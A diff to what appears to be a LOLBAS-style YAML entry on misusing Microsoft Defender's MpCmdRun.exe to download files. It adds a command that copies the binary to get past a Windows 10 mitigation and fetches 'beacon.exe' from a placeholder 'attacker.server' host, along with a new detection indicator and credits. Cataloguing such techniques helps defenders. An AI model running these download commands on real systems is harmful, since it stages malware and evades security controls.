@@ -5,7 +5,15 @@ Author: 'Oddvar Moe'
 Created: '09/03/2020'
 Commands:
   - Command: MpCmdRun.exe -DownloadFile -url https://attacker.server/beacon.exe -path c:\\temp\\beacon.exe
-    Description: Download file to specified path
+    Description: Download file to specified path - Slashes work as well as dashes (/DownloadFile, /url, /path)
+    Usecase: Download file
+    Category: Download
+    Privileges: User
+    MitreID: T1105
+    MitreLink: https://attack.mitre.org/wiki/Technique/T1105
+    OperatingSystem: Windows 10
+  - Command: copy "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" C:\Users\Public\Downloads\MP.exe && chdir "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\" && "C:\Users\Public\Downloads\MP.exe" -DownloadFile -url https://attacker.server/beacon.exe -path C:\Users\Public\Downloads\evil.exe
+    Description: Download file to specified path - Slashes work as well as dashes (/DownloadFile, /url, /path) [updated version to bypass Windows 10 mitigation]
     Usecase: Download file
     Category: Download
     Privileges: User
@@ -31,6 +39,7 @@ Detection:
   - IOC: MpCmdRun getting a file from a remote machine or the internet that is not expected.
   - IOC: Monitor process creation for non-SYSTEM and non-LOCAL SERVICE accounts launching mpcmdrun.exe.
   - IOC: Monitor for the creation of %USERPROFILE%\AppData\Local\Temp\MpCmdRun.log
+  - IOC: User Agent is "MpCommunication"
 Resources:
   - Link: https://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-antivirus/command-line-arguments-microsoft-defender-antivirus
   - Link: https://twitter.com/mohammadaskar2/status/1301263551638761477
@@ -41,4 +50,8 @@ Acknowledgement:
     Handle: '@mohammadaskar2'
   - Person: Oddvar Moe
     Handle: '@oddvarmoe'
+  - Person: RichRumble
+    Handle: ''
+  - Person: Cedric
+    Handle: '@th3c3dr1c'
 ---
